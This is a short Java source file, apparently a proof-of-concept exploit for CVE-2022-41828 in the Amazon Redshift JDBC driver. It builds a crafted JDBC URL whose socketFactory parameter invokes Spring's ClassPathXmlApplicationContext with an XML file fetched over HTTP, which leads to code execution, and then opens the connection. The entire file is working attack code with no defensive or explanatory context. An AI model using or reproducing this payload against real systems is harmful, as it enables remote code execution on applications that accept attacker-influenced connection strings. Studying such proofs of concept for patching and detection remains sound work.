package redshift;

import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.SQLException;

public class CVE_2022_41828 {
    public static void main(String[] args) throws ClassNotFoundException, SQLException {
        Class.forName("com.amazon.redshift.jdbc.Driver");
        String payload = "payload=jdbc:redshift://127.0.0.1:5439/mediocrity?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext@socketFactoryArg=http://127.0.0.1/cve_2022_41828_linux.xml";
        Connection connection = DriverManager.getConnection(payload);
    }
}
